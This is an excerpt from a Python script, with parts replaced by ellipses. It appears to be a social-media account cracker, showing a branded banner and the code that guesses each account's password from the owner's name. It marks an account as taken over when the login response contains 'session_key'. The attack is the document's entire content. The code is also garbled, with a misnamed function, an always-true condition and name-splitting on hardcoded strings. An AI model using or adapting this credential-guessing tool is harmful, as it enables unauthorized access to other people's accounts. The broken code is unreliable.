...
{G}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 
\033[1;93m=================================
\033[1;97m Owner  : Rakib Chowdhury :/
\033[1;97m GitHub : Rakibvai407 :/
...
def andom():
    ...
    if 'o': 
        ...
        totalpass.append('Rakib')
        totalpass.append('Chowdhury')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
    ...
    def start(user):
     try:
        ...
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit("Rakib")[0]
        try:
            last = name.rsplit("Chowdhury")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
    ...
    def start2(user):
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97RAKIB-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
